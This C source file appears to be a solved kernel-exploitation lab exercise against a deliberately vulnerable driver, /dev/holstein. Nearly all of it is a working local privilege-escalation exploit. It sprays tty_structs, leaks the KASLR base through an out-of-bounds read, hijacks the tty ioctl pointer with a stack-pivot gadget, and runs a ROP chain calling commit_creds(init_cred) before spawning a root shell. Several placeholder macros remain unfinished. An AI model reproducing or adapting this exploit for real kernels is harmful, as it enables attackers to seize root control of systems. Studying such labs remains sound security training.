#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <signal.h>

#define IS_ERROR(c, s)                                                         \
    {                                                                          \
        if ((c)) {                                                             \
            perror((s));                                                       \
            exit(EXIT_FAILURE);                                                \
        }                                                                      \
    }

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define NUM_TTYS 100

int ttys[NUM_TTYS];
int fd = 0;

void spray_tty_structs() {

    // for (int j = 1; j < 50; j++)
    //     open("/dev/ptmx", O_RDWR | O_NOCTTY);
    
    fd = open("/dev/holstein", O_RDWR);

    for (int i = 0; i < NUM_TTYS; i++) {
        ttys[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
      const struct tty_operations *ops;
      0xffff888002fd8418|+0x0018|+003: 0xffffffff81c38760  ->  0xffffffff81323a30  ->  0x81eb9fe0c7c74855

*/

unsigned long kaslr_base;

#define PTM_UNIX98_OPS_OFFSET /* ??? */

#define INIT_CRED (0xe37760)
#define COMMIT_CREDS (0x0744b0)



#define rop_pop_rdi 0x32f59


#define STACK_PIVOT_GADGET (kaslr_base + /* ??? */)
#define FAKE_STACK_ADDR /* ??? */
#define PAGE_SIZE 0x1000
#define swapgs 0x6266bc
#define iretq 0xfd3cc4

#define swapgs_restore_regs_and_return_to_usermode 0x800e26

/*
    0xffffffff815a9741: mov esp, 0xf6000000; ret;
    xffffffff815a9798: mov esp, 0x39000000; ret;

*/

void exec_shell() {
    char *args[] = { "/bin/sh", "-i", NULL };

    execve("/bin/sh", args, NULL);
}

unsigned long user_cs, user_ss, user_rsp, user_rflags, user_rip;

void save_user_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    user_rip = (unsigned long) &exec_shell;
}

void setup_fake_stack() {
    unsigned long *fake_stack =
        mmap((void *)0x38FFF000, PAGE_SIZE * 2, PROT_READ | PROT_WRITE | PROT_EXEC,
             MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

    printf("fake_stack : %p\n", fake_stack);
    //int offset = PAGE_SIZE / sizeof(unsigned long);

    unsigned long *chain = (unsigned long*)0x39000000;

    *chain++ = kaslr_base + rop_pop_rdi;
    *chain++ = kaslr_base + INIT_CRED;
    *chain++ = kaslr_base + COMMIT_CREDS;

    *chain++ = kaslr_base + swapgs_restore_regs_and_return_to_usermode; // return to usermode
    *chain++ = 0x0;
    *chain++ = 0x0;

    *chain++= (unsigned long)&exec_shell;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;
    
    /* ... */
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

int main() {






    save_user_state();

    // // TODO #1 : Allocate g_buf around tty_structs.
    // //           Implement spray_tty_structs() first, then use it.
    spray_tty_structs();



    // // TODO #2 : Leak KASLR base.
    // //           You need to calculate PTM_UNIX98_OPS_OFFSET first.

    unsigned long ops_addr = 0;

    char buf[0x500] = {0};
    read(fd, buf, 0x500);

    ops_addr = *(unsigned long*)&buf[0x418];
    kaslr_base = ops_addr - 0xc38880;

    printf("kaslr_base : 0x%lx\n", kaslr_base);


    // // TODO #3 : Overwrite function table of the target object.
    // //           Leverage ioctl() function pointer to invoke STACK_PIVOT_GADGET.
    // //           You need to find proper gadget first


/*
0xffffffff815a9741: mov esp, 0xf6000000; ret;
0xffffffff815a9798: mov esp, 0x39000000; ret;

*/


    unsigned long fake_tty_operations[0x20];

    fake_tty_operations[0xC] = (unsigned long)(kaslr_base + 0x5a9798); //pivot

    //*(unsigned long*)&buf[0x408] = kaslr_base + 0x5a9798;
    *(unsigned long*)&buf[0x418] = (unsigned long)&fake_tty_operations;
   // *(unsigned long*)&buf[0x418] = kaslr_base + 0x5a9798; 
    //*(unsigned long*)&buf[0x418] = kaslr_base + 0x5a9741; //mov esp, 0xf6000000; ret;
    //printf("Pivot Gadget: 0x%lx\n", *(unsigned long*)&buf[0x418]);
    write(fd, buf, 0x500);

    // // TODO #4 : Implement setup_fake_stack().
    // //           This function maps a userland memory and prepares the ROP chain.
    setup_fake_stack();

    // // TODO #5 : Trigger CFHP.
    // //           Loop through ttys[] and invoke ioctl() system call.
    for (int i = 0; i < NUM_TTYS; i++)
        ioctl(ttys[i], 0, 0);

    //getchar();

    return 0;
}